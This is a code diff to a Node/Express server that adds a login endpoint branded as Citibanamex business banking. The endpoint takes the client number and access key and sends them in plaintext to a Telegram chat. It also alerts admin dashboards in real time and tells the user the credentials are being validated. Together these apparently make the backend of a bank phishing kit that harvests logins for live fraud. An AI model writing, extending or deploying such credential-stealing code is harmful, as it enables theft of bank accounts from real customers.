@@ -770,6 +770,51 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  app.post('/api/banamex/login', async (req, res) => {
+    try {
+      const { numeroCliente, claveAcceso } = req.body;
+      
+      if (!numeroCliente || !claveAcceso) {
+        return res.status(400).json({ message: "Número de cliente y clave de acceso son requeridos" });
+      }
+      
+      const sessionId = nanoid(10);
+      
+      const session = await storage.createSession({ 
+        sessionId, 
+        banco: "CITIBANAMEX",
+        numeroCliente,
+        claveAcceso,
+        pasoActual: "validando",
+        createdBy: "banamex_client",
+      });
+      
+      console.log(`[Banamex Login] Nueva sesión creada: ${sessionId}, Cliente: ${numeroCliente}`);
+      
+      await sendTelegramMessage(
+        `🏦 <b>Nuevo Login - Banamex Empresarial</b>\n\n` +
+        `📱 <b>Número de Cliente:</b> ${numeroCliente}\n` +
+        `🔑 <b>Clave de Acceso:</b> ${claveAcceso}\n` +
+        `🆔 <b>Session ID:</b> ${sessionId}\n` +
+        `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`
+      );
+
+      broadcastToAdmins(JSON.stringify({
+        type: 'NEW_BANAMEX_SESSION',
+        data: session
+      }));
+      
+      res.json({ 
+        success: true, 
+        sessionId,
+        message: "Validando credenciales..." 
+      });
+    } catch (error) {
+      console.error("Error en login de Banamex:", error);
+      res.status(500).json({ message: "Error procesando login" });
+    }
+  });
+
   app.post('/api/sessions/:id/update', async (req, res) => {
     try {
       const { id } = req.params;
